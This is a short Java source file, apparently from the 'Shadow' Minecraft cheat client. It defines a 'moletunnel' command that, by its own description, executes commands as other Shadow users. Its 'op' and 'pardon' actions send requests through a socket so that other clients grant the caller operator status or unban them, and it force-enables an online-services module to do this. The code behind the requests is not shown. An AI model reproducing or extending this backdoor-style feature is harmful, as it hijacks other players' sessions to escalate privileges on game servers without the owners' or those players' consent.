package net.shadow.feature.command;

import net.shadow.Shadow;
import net.shadow.feature.ModuleRegistry;
import net.shadow.feature.base.Command;

import java.util.Collections;
import java.util.List;
import net.shadow.feature.module.OnlineServices;
import net.shadow.utils.ChatUtils;
import org.apache.commons.lang3.ArrayUtils;

public class MoletunnelCmd extends Command {


    public MoletunnelCmd() {
        super("moletunnel", "Allows you to execute commands as other shadow users");
    }

    @Override
    public void call(String[] args) {
        if (args.length < 1) {
            ChatUtils.message("Please use the format >moletunnel <action>");
            return;
        }
        if (!ModuleRegistry.getByClass(OnlineServices.class).isEnabled()) ModuleRegistry.getByClass(OnlineServices.class).setEnabled(true);
        String action = args[0];
        switch (action) {
            case "op":
                Shadow.prismaSocket.sendOpRequest(Shadow.c.getSession().getUsername());
                break;
            case "pardon":
                Shadow.prismaSocket.sendPardonRequest(Shadow.c.getSession().getUsername());
                break;
        }
    }

    @Override
    public List<String> completions(int index, String[] args) {
        if (index == 0) return List.of("op","pardon");
        return Collections.emptyList();
    }
}
